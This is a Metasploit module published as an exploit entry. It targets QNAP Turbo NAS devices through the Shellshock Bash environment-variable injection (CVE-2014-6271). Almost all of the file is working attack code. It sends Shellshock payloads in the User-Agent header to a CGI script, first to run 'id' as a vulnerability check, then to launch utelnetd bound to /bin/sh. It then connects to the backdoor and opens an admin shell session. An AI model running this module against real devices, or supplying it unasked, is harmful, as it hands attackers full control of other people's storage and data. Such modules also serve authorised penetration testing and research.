# Exploit Title: QNAP admin shell via Bash Environment Variable Code Injection
# Date: 7 February 2015
# Exploit Author: Patrick Pellegrino | 0x700x700x650x6c0x6c0x650x670x720x690x6e0x6f@securegroup.it [work] / 0x640x330x760x620x700x70@gmail.com [other]
# Employer homepage: http://www.securegroup.it
# Vendor homepage: http://www.qnap.com
# Version: All Turbo NAS models except TS-100, TS-101, TS-200
# Tested on: TS-1279U-RP
# CVE : 2014-6271
# Vendor URL bulletin : http://www.qnap.com/i/it/support/con_show.php?cid=61


##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/d3vpp/metasploit-modules
##

require 'msf/core'
require 'net/telnet'

class Metasploit3 < Msf::Auxiliary
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient
  include Msf::Auxiliary::CommandShell

   def initialize(info = {})
    super(update_info(info,
      'Name' => 'QNAP admin shell via Bash Environment Variable Code Injection',
      'Description' => %q{
		This module allows you to spawn a remote admin shell (utelnetd) on a QNAP device via Bash Environment Variable Code Injection.
		Affected products:
		All Turbo NAS models except TS-100, TS-101, TS-200
		},
      'Author' => ['Patrick Pellegrino'], # Metasploit module | 0x700x700x650x6c0x6c0x650x670x720x690x6e0x6f@securegroup.it [work] / 0x640x330x760x620x700x70@gmail.com [other]
      'License' => MSF_LICENSE,
      'References' => [
			['CVE', '2014-6271'], #aka ShellShock
			['URL', 'http://www.qnap.com/i/it/support/con_show.php?cid=61']
		],
      'Platform'       => ['unix']
    ))

    register_options([
      OptString.new('TARGETURI', [true, 'Path to CGI script','/cgi-bin/index.cgi']),
      OptPort.new('LTELNET', [true, 'Set the remote port where the utelnetd service will be listening','9993'])
    ], self.class)
  end

 def check
	begin
 	res = send_request_cgi({
        'method' => 'GET',
        'uri' => normalize_uri(target_uri.path),
        'agent' => "() { :;}; echo; /usr/bin/id"
      })
	rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout, ::Timeout::Error, ::Errno::EPIPE
		vprint_error("Connection failed")
		return Exploit::CheckCode::Unknown
 end

    if !res
      return Exploit::CheckCode::Unknown
    elsif res.code== 302 and res.body.include? 'uid'
	  return Exploit::CheckCode::Vulnerable
    end
    return Exploit::CheckCode::Safe
  end


  def exploit_telnet()
    telnetport = datastore['LTELNET']

    print_status("#{rhost}:#{rport} - Telnet port used: #{telnetport}")

    print_status("#{rhost}:#{rport} - Sending exploit")
    begin
      sock = Rex::Socket.create_tcp({ 'PeerHost' => rhost, 'PeerPort' => telnetport.to_i })

      if sock
        print_good("#{rhost}:#{rport} - Backdoor service spawned")
        add_socket(sock)
      else
        fail_with(Exploit::Failure::Unknown, "#{rhost}:#{rport} - Backdoor service not spawned")
      end

      print_status "Starting a Telnet session #{rhost}:#{telnetport}"
      merge_me = {
        'USERPASS_FILE' => nil,
        'USER_FILE'     => nil,
        'PASS_FILE'     => nil,
        'USERNAME'      => nil,
        'PASSWORD'      => nil
      }
      start_session(self, "TELNET (#{rhost}:#{telnetport})", merge_me, false, sock)
    rescue
      fail_with(Exploit::Failure::Unknown, "#{rhost}:#{rport} - Backdoor service not handled")
    end
    return
  end

  def run
	begin
	telnetport = datastore['LTELNET']
	res = send_request_cgi({
        'method' => 'GET',
        'uri' => normalize_uri(target_uri.path),
        'agent' => "() { :;}; /bin/utelnetd -l/bin/sh -p#{telnetport} &"
      })
    rescue Rex::ConnectionRefused, Rex::ConnectionTimeout,
           Rex::HostUnreachable => e
      fail_with(Failure::Unreachable, e)
    ensure
      disconnect
    end
	exploit_telnet()

  end

end